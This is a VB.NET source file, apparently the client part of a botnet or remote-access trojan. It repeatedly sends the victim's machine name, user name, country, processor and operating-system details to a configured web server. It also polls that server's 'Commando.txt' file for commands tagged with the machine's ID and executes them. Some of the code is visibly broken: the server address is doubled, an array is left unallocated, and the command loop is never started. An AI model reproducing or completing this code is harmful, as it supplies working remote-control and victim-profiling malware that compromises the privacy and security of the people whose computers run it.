Imports System.Threading
Public Class Client
    Inherits Commands
    Private UniqueID As New UniqueID
    Private d() As String = {"|", ">"}
    Private Sub TryConnect()
        While True
            Dim Response As String = Network.SendRequest("POST", Config.WebServer & Config.WebServer & "usr.php", "Country=" & UniqueID.Country &
                                                                                                                  "&Id=" & UniqueID.Generate &
                                                                                                                  "&MachineName=" & Environment.MachineName &
                                                                                                                  "&UserName=" & Environment.UserName &
                                                                                                                  "&ProcessorName=" & UniqueID.ProcessorName &
                                                                                                                  "&OperatingSystemName=" & UniqueID.OperatingSystemName & "&OperatingSystemArchitecture=" & UniqueID.OperatingSystemArchitecture)
            Thread.Sleep(30 * 1000)
        End While
    End Sub
    Private Sub ReceiveCommand()
        Dim CommandId As String = Nothing
        Dim LastCommandId As String = Nothing
        Dim Response As String = Nothing
        While (True)
            Try
                Response = Network.GetResponse(Config.WebServer & "Commando.txt")
                If Response IsNot Nothing Then
                    If Response.Contains(d(0)) And CommandId IsNot LastCommandId Then
                        'COMMAND_ID TARGET COMMAND
                        Dim ItemArgs() As String = Response.Split(d(0))
                        Dim RawCommandArgs() As String = Nothing
                        Dim CookedCommandArgs() As String = Nothing
                        CommandId = ItemArgs(0)
                        If ItemArgs(1) = UniqueID.Generate Then
                            LastCommandId = CommandId
                            'COMMAND ARG ARG ARG
                            RawCommandArgs = ItemArgs(2).Split(d(1))
                            For i As Integer = 1 To RawCommandArgs.Length
                                CookedCommandArgs(i - 1) = RawCommandArgs(i)
                            Next
                            'Execute
                            ExecuteCommand(RawCommandArgs(0), CookedCommandArgs)
                        End If
                    End If
                End If
            Catch : End Try
        End While
    End Sub
    Public Sub New()
        Dim Connection As New Thread(AddressOf TryConnect)
        Connection.Start()
    End Sub
End Class
